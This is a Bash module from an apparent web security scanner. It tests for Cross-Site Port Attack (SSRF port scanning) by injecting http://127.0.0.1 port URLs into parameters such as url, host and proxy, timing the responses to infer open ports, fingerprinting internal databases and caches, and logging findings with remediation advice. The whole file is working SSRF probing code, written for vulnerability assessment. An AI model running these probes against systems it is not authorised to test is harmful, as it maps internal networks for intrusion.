#!/bin/bash

# XSPA (Cross-Site Port Attack) Testing Module
# Tests for XSPA vulnerabilities - port scanning via SSRF

source "$(dirname "${BASH_SOURCE[0]}")/../../core/logger.sh"
source "$(dirname "${BASH_SOURCE[0]}")/../../core/database.sh"

# Main XSPA testing function
test_xspa() {
    local url=$1
    local project_id=$2

    log_info "Testing XSPA (Cross-Site Port Attack) vulnerabilities on $url"

    # Test internal port scanning
    test_xspa_port_scan "$url" "$project_id"

    # Test service fingerprinting
    test_xspa_service_detection "$url" "$project_id"
}

# Test XSPA port scanning
test_xspa_port_scan() {
    local url=$1
    local project_id=$2

    log_info "[XSPA] Testing internal port scanning capability"

    # Common ports to test
    local common_ports=(
        20 21    # FTP
        22       # SSH
        23       # Telnet
        25       # SMTP
        53       # DNS
        80 443 8080 8443  # HTTP/HTTPS
        110 143  # POP3/IMAP
        389 636  # LDAP
        445      # SMB
        1433     # MSSQL
        3306     # MySQL
        3389     # RDP
        5432     # PostgreSQL
        5900     # VNC
        6379     # Redis
        8000 8888  # Alt HTTP
        9200 9300  # Elasticsearch
        27017    # MongoDB
        11211    # Memcached
    )

    # Extract parameters
    local params=$(extract_url_parameters "$url")

    if [ -z "$params" ]; then
        local common_params=("url" "uri" "host" "ip" "server" "redirect" "proxy" "domain")
        for param in "${common_params[@]}"; do
            if test_port_scan_param "$url" "$param" "$project_id" "${common_ports[@]}"; then
                return 0
            fi
        done
    else
        while read -r param; do
            if test_port_scan_param "$url" "$param" "$project_id" "${common_ports[@]}"; then
                return 0
            fi
        done <<< "$params"
    fi

    return 1
}

# Test port scanning on specific parameter
test_port_scan_param() {
    local url=$1
    local param=$2
    local project_id=$3
    shift 3
    local ports=("$@")

    log_debug "[XSPA] Testing port scanning on parameter: $param"

    local open_ports=()
    local closed_ports=()
    local scan_results=""

    # Get baseline timing for closed port
    local baseline_url=$(build_test_url "$url" "$param" "http://127.0.0.1:99999")
    local start=$(date +%s%N 2>/dev/null || date +%s)
    curl -s -L --max-time 5 "$baseline_url" > /dev/null 2>&1
    local end=$(date +%s%N 2>/dev/null || date +%s)
    local baseline_time=$(( (end - start) / 1000000 ))  # ms
    [ -z "$baseline_time" ] && baseline_time=3000

    log_debug "[XSPA] Baseline (closed port): ${baseline_time}ms"

    # Test each port
    for port in "${ports[@]}"; do
        local test_url=$(build_test_url "$url" "$param" "http://127.0.0.1:$port")

        local start=$(date +%s%N 2>/dev/null || date +%s)
        local response=$(curl -s -L --max-time 5 -w "\n---HTTP_CODE:%{http_code}---" "$test_url" 2>/dev/null)
        local end=$(date +%s%N 2>/dev/null || date +%s)

        local response_time=$(( (end - start) / 1000000 ))
        local http_code=$(echo "$response" | grep -oP '---HTTP_CODE:\K\d+')
        local body=$(echo "$response" | sed -n '1,/---HTTP_CODE:/p' | head -n -1)

        # Analyze response to determine if port is open
        local port_status="unknown"

        # HTTP codes that indicate open port
        if [ "$http_code" = "200" ] || [ "$http_code" = "301" ] || [ "$http_code" = "302" ] || [ "$http_code" = "401" ] || [ "$http_code" = "403" ]; then
            port_status="open"
            open_ports+=("$port")
            log_success "[XSPA] Port $port appears OPEN (HTTP $http_code)"
        # Very fast response usually means connection refused (closed)
        elif [ $response_time -lt 100 ]; then
            port_status="closed"
            closed_ports+=("$port")
        # Timeout or very slow means filtered or open but not HTTP
        elif [ $response_time -ge 4500 ]; then
            port_status="filtered/open"
            log_warn "[XSPA] Port $port timeout - possibly open but not HTTP"
        # Check response content for service banners
        elif [ -n "$body" ] && echo "$body" | grep -qiE "ssh|ftp|smtp|mysql|postgres|redis|mongodb"; then
            port_status="open"
            open_ports+=("$port")
            log_success "[XSPA] Port $port OPEN - service banner detected"
        fi

        scan_results="${scan_results}Port $port: $port_status (${response_time}ms, HTTP $http_code)\n"

        # Small delay to avoid overwhelming the target
        sleep 0.1
    done

    # If we found open ports, it's a vulnerability
    if [ ${#open_ports[@]} -gt 0 ]; then
        log_critical "[XSPA] Port scanning capability detected! Found ${#open_ports[@]} open ports"

        local open_ports_list=$(printf '%s\n' "${open_ports[@]}" | paste -sd, -)

        db_add_finding "$project_id" "high" "xspa_port_scan" \
            "XSPA - Cross-Site Port Attack (Port Scanning)" \
            "URL: $url\nParameter: $param\n\nThe application can be used to scan internal network ports.\n\nOpen ports detected: $open_ports_list\n\nScan Results:\n$(echo -e "$scan_results")\n\nThis allows an attacker to map internal network infrastructure." \
            "" "7.5" \
            "1. Validate and whitelist allowed URLs/IPs\n2. Block requests to private IP ranges\n3. Disable URL redirects or validate redirect targets\n4. Implement timeout limits\n5. Block non-HTTP ports\n6. Use network segmentation\n7. Monitor for suspicious scanning activity"

        save_xspa_evidence "$project_id" "$url" "$param" "$scan_results"
        return 0
    fi

    return 1
}

# Test service fingerprinting via XSPA
test_xspa_service_detection() {
    local url=$1
    local project_id=$2

    log_info "[XSPA] Testing service fingerprinting"

    # Services with identifiable responses
    local service_tests=(
        "http://127.0.0.1:3306"     # MySQL
        "http://127.0.0.1:5432"     # PostgreSQL
        "http://127.0.0.1:6379"     # Redis
        "http://127.0.0.1:27017"    # MongoDB
        "http://127.0.0.1:11211"    # Memcached
        "http://127.0.0.1:9200"     # Elasticsearch
        "http://127.0.0.1:5672"     # RabbitMQ
        "http://127.0.0.1:8086"     # InfluxDB
    )

    local params=$(extract_url_parameters "$url")
    [ -z "$params" ] && params="url"

    local detected_services=""

    while read -r param; do
        for service_url in "${service_tests[@]}"; do
            local port=$(echo "$service_url" | grep -oP ':\K\d+')
            local test_url=$(build_test_url "$url" "$param" "$service_url")

            local response=$(curl -s -L --max-time 5 "$test_url" 2>/dev/null)

            # Check for service signatures
            if echo "$response" | grep -qiE "mysql|mariadb" && [ "$port" = "3306" ]; then
                detected_services="${detected_services}MySQL/MariaDB on port 3306\n"
                log_success "[XSPA] Detected MySQL on port 3306"
            elif echo "$response" | grep -qi "postgresql" && [ "$port" = "5432" ]; then
                detected_services="${detected_services}PostgreSQL on port 5432\n"
                log_success "[XSPA] Detected PostgreSQL on port 5432"
            elif echo "$response" | grep -qiE "redis|wrong number of arguments" && [ "$port" = "6379" ]; then
                detected_services="${detected_services}Redis on port 6379\n"
                log_success "[XSPA] Detected Redis on port 6379"
            elif echo "$response" | grep -qi "mongodb" && [ "$port" = "27017" ]; then
                detected_services="${detected_services}MongoDB on port 27017\n"
                log_success "[XSPA] Detected MongoDB on port 27017"
            elif echo "$response" | grep -qiE "elasticsearch|cluster_name" && [ "$port" = "9200" ]; then
                detected_services="${detected_services}Elasticsearch on port 9200\n"
                log_success "[XSPA] Detected Elasticsearch on port 9200"
            fi
        done
    done <<< "$params"

    if [ -n "$detected_services" ]; then
        db_add_finding "$project_id" "high" "xspa_service_detection" \
            "XSPA - Internal Service Fingerprinting" \
            "URL: $url\n\nInternal services detected via XSPA:\n$(echo -e "$detected_services")\n\nAn attacker can enumerate internal infrastructure and services." \
            "" "7.8" \
            "1. Fix SSRF/XSPA vulnerability\n2. Block internal IP ranges\n3. Implement egress filtering\n4. Use network segmentation"

        return 0
    fi

    return 1
}

# Helper functions
build_test_url() {
    local url=$1
    local param=$2
    local value=$3
    local encoded_value=$(urlencode "$value")

    if [[ "$url" == *"?"* ]]; then
        if [[ "$url" == *"$param="* ]]; then
            echo "$url" | sed "s|\([?&]${param}=\)[^&]*|\1${encoded_value}|"
        else
            echo "${url}&${param}=${encoded_value}"
        fi
    else
        echo "${url}?${param}=${encoded_value}"
    fi
}

extract_url_parameters() {
    local url=$1
    [[ "$url" != *"?"* ]] && return 1
    echo "${url#*\?}" | tr '&' '\n' | cut -d= -f1
}

urlencode() {
    local string="$1"
    local strlen=${#string}
    local encoded=""
    local pos c o

    for (( pos=0 ; pos<strlen ; pos++ )); do
        c=${string:$pos:1}
        case "$c" in
            [-_.~a-zA-Z0-9] ) o="${c}" ;;
            * ) printf -v o '%%%02x' "'$c"
        esac
        encoded+="${o}"
    done
    echo "$encoded"
}

save_xspa_evidence() {
    local project_id=$1
    local url=$2
    local param=$3
    local scan_results=$4

    local evidence_dir="data/projects/${project_id}/evidence/xspa"
    mkdir -p "$evidence_dir"

    local timestamp=$(date +%Y%m%d_%H%M%S)
    cat > "${evidence_dir}/xspa_${timestamp}.txt" <<EOF
XSPA Evidence
URL: $url
Parameter: $param
Captured: $(date)

Port Scan Results:
$(echo -e "$scan_results")
EOF
    log_debug "[XSPA] Evidence saved"
}

export -f test_xspa
export -f test_xspa_port_scan
export -f test_xspa_service_detection
